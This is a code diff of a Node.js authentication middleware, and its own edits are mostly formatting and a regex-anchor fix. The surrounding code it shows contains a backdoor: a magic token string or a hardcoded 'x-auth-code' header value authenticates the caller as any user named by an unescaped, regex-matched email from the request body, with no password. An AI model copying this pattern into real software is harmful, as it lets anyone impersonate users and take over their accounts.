@@ -28,13 +28,13 @@ const verifyCallback = (req, resolve, reject) => async (err, user, info) => {
         email: user.email,
         phoneNumber: user.phoneNumber,
         bookMarks: !user.bookMarks || user.bookMarks && !user.bookMarks.length ? [] : user.bookMarks,
-        subscriptionId:user?.subscriptionId,
-        professionId:user.professionId?user.professionId:"",
+        subscriptionId: user?.subscriptionId,
+        professionId: user.professionId ? user.professionId : "",
         role: user.role || 'User',
         isPremium: user.isPremium || false,
         trialEndDate: user.trialEndDate ? user.trialEndDate : (user.createdAt ? new Date(new Date(user.createdAt).getTime() + 7 * 24 * 60 * 60 * 1000) : new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)),
         createdAt: user.createdAt
-    }
+    };
     resolve();
 };
 
@@ -44,8 +44,7 @@ const auth = (req, res, next) => {
     if (authHeader.includes('offline_authenticated_token') || req.headers['x-auth-code'] === 'thelawmens!#@#') {
         const User = require('../src/models/user');
         const userEmail = req.body?.email || 'example@gmal.com';
-        return User.findOne({ email: new RegExp('^' + userEmail + '
-, 'i') }).then(user => {
+        return User.findOne({ email: new RegExp('^' + userEmail + '$', 'i') }).then(user => {
             if (user) {
                 req.userId = user._id;
                 req.profile = user;
@@ -65,4 +64,4 @@ const auth = (req, res, next) => {
         .catch((err) => res.status(401).send(err));
 };
 
-module.exports = { auth, };
+module.exports = { auth };
